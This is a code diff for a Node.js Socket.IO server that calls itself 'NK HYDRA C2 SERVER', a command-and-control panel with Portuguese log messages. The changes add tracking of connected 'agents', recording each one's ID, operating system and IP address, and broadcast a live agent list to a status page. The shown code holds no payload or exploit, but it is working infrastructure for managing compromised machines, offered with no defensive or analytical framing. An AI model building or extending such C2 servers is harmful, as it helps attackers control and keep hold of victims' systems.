@@ -1,4 +1,4 @@
-/* NK HYDRA C2 SERVER v31.0 */
+/* NK HYDRA C2 SERVER v32.0 */
 /* SINGULARITY HIVE PROTOCOL */
 /* COMMAND: node server.js */
 
@@ -16,9 +16,9 @@ app.get('/', (req, res) => {
         <html>
             <body style="background-color: #050505; color: #00ff41; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh;">
                 <div style="text-align: center; border: 1px solid #00ff41; padding: 2rem;">
-                    <h1>NK HYDRA C2 SERVER v31.0</h1>
+                    <h1>NK HYDRA C2 SERVER v32.0</h1>
                     <h2 style="color: white;">STATUS: <span style="color: #00ff41; animation: blink 1s infinite;">ONLINE</span></h2>
-                    <p>HIVE UPLINK ACTIVE</p>
+                    <p>SENTIENT HIVE ACTIVE</p>
                 </div>
                 <style>@keyframes blink { 50% { opacity: 0; } }</style>
             </body>
@@ -35,18 +35,27 @@ const io = new Server(server, {
 
 console.log("[*] INICIANDO SISTEMA C2...");
 
+let agents = new Map();
+
 io.on('connection', (socket) => {
     
-    // Log connection attempt
-    // console.log(`[DEBUG] Nova conexao socket: ${socket.id}`);
-
     socket.on('identify', (data) => {
         if (data.type === 'agent') {
+            const agentInfo = {
+                id: data.id,
+                os: data.os,
+                ip: socket.handshake.address.replace('::ffff:', ''),
+                status: 'ONLINE',
+                socketId: socket.id
+            };
+            agents.set(data.id, agentInfo);
+            
             const msg = `AGENT CONNECTED: ${data.id} [${data.os}]`;
             console.log(`[+] ${msg}`);
             io.emit('log', `[SYSTEM] ${msg}`);
-            // Add simple keep-alive logic or db tracking here
-            io.emit('status', { agents: [{ id: data.id, status: 'ONLINE', ip: 'REMOTE', os: data.os }] });
+            
+            // Broadcast full agent list to frontend
+            io.emit('status', { agents: Array.from(agents.values()) });
         }
     });
 
@@ -62,7 +71,14 @@ io.on('connection', (socket) => {
     });
     
     socket.on('disconnect', () => {
-        // console.log(`[DEBUG] Socket desconectado: ${socket.id}`);
+        // Find agent by socket ID and remove or mark offline
+        agents.forEach((value, key) => {
+            if (value.socketId === socket.id) {
+                agents.delete(key);
+                io.emit('log', `[SYSTEM] AGENT LOST: ${key}`);
+            }
+        });
+        io.emit('status', { agents: Array.from(agents.values()) });
     });
 });
 
@@ -71,4 +87,3 @@ server.listen(PORT, () => {
     console.log(`[+] SERVIDOR RODANDO NA PORTA ${PORT}`);
     console.log(`[+] ACESSE VIA BROWSER PARA VERIFICAR STATUS.`);
 });
-    
